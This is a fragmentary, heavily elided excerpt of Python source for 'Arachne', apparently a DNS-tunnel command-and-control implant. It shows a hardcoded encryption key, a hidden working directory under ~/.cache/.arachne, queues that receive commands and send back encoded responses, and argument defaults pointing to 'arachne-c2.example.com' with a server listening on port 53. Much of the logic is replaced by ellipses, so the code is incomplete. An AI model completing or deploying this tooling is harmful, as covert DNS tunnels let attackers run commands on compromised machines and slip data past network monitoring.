...
class DNSTunnel:
    def __init__(
        ...
        self.encryption_key = hashlib.sha256(b"ArachneDNSTunnel2024").digest()

        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.running = False

        self.output_dir = os.path.expanduser("~/.cache/.arachne/dns_tunnel")
                            ...
                            if decoded:
                                try:
                                    ...
                                    if command_data.get("type") == "command":
                                        ...
                                        # Encode response
                                        response_encoded = self.encode_data(
...
def arachne_integration():
    ...
    parser = argparse.ArgumentParser(description="Arachne DNS Tunnel")
    parser.add_argument(
        "--mode", choices=["client", "server"], default="client", help="Tunnel mode"
    )
    parser.add_argument(
        "--domain", default="arachne-c2.example.com", help="Domain for DNS tunnel"
    )
    parser.add_argument("--command", help="Command to execute (client mode only)")
    parser.add_argument(
        "--listen-ip", default="0.0.0.0", help="Listen IP (server mode)"
    )
    parser.add_argument(
        "--listen-port", type=int, default=53, help="Listen port (server mode)"
    )
    parser.add_argument(
        "--upstream-dns", default="8.8.8.8", help="Upstream DNS server (client mode)"
    )
